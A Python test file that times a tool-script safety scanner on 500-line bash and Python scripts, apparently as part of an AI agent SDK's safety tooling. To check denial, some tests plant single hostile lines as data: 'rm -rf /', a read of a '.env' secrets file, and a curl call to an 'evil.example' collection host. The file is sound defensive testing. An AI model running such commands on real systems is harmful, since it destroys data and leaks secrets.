import time

from trpc_agent_sdk.tools.safety import Decision
from trpc_agent_sdk.tools.safety import ToolScriptSafetyScanner


def test_scans_500_line_bash_script_under_one_second():
    script = "\n".join(f"echo line-{index}" for index in range(500))
    scanner = ToolScriptSafetyScanner()

    started = time.perf_counter()
    report = scanner.scan_script(script, "bash")
    elapsed = time.perf_counter() - started

    assert report.decision.value == "allow"
    assert elapsed <= 1.0


def test_scans_500_line_python_script_under_one_second():
    script = "\n".join(f"print('line-{index}')" for index in range(500))
    scanner = ToolScriptSafetyScanner()

    started = time.perf_counter()
    report = scanner.scan_script(script, "python")
    elapsed = time.perf_counter() - started

    assert report.decision == Decision.ALLOW
    assert elapsed <= 1.0


def test_scans_500_line_script_with_one_risky_line_under_one_second():
    script = "\n".join(["echo safe"] * 250 + ["rm -rf /"] + ["echo safe"] * 249)
    scanner = ToolScriptSafetyScanner()

    started = time.perf_counter()
    report = scanner.scan_script(script, "bash")
    elapsed = time.perf_counter() - started

    assert report.decision == Decision.DENY
    assert "BASH_DANGEROUS_RM_RF" in {finding.rule_id for finding in report.findings}
    assert elapsed <= 1.0


def test_scans_500_line_python_script_with_secret_read_under_one_second():
    script = "\n".join(["print('safe')"] * 250 + ["open('.env').read()"] + ["print('safe')"] * 249)
    scanner = ToolScriptSafetyScanner()

    started = time.perf_counter()
    report = scanner.scan_script(script, "python")
    elapsed = time.perf_counter() - started

    assert report.decision != Decision.ALLOW
    assert elapsed <= 1.0


def test_scans_500_line_bash_script_with_network_egress_under_one_second():
    script = "\n".join(["echo safe"] * 250 + ["curl https://evil.example/collect"] + ["echo safe"] * 249)
    scanner = ToolScriptSafetyScanner()

    started = time.perf_counter()
    report = scanner.scan_script(script, "bash")
    elapsed = time.perf_counter() - started

    assert report.decision != Decision.ALLOW
    assert elapsed <= 1.0
